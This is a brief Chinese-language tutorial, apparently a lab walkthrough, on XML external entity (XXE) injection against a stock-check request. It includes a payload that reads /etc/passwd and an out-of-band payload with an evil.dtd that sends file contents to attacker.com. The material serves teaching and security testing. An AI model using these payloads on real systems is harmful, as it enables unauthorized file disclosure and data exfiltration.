XML外部实体（XXE）攻击是一种针对基于XML的应用程序的网络安全漏洞。  
XXE攻击发生时，攻击者能够利用XML解析器的特性，通过构造恶意的XML输入来执行未授权的操作。  
这可能包括读取服务器上的文件、访问后端服务、进行拒绝服务攻击，以及更多其他的恶意行为。  

<img width="1062" height="575" alt="image" src="https://github.com/user-attachments/assets/7011e1f1-19e6-4a92-bbdf-37565905f537" />

直接上例子  
针对content-type = xml  
<img width="1139" height="770" alt="image" src="https://github.com/user-attachments/assets/e7f46da4-f18e-4987-a807-60b42df174a1" />

插入测试poc  
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<img width="1161" height="742" alt="image" src="https://github.com/user-attachments/assets/60d0661f-67b9-49e6-8ced-30f8ebdd2a4b" />
这时可以发现回显股票信息64，为了正常回显出我们需要的数据，这时将productId编号1替换为 &xxe;（对外部实体的引用）

<img width="1156" height="734" alt="image" src="https://github.com/user-attachments/assets/ec08d3c9-24da-48b9-b6b8-a623a25661a2" />

---
如果遇到无回显：  
1.外带数据(OOB - Out-of-Band)  
 通过让服务器向攻击者控制的服务器发起请求来带出数据：  
 <!DOCTYPE foo [  
  <!ENTITY % file SYSTEM "file:///etc/passwd">  
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">  
  %dtd;  
]>  
<foo>&send;</foo>  
其中evil.dtd内容：   
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">  
%all;  

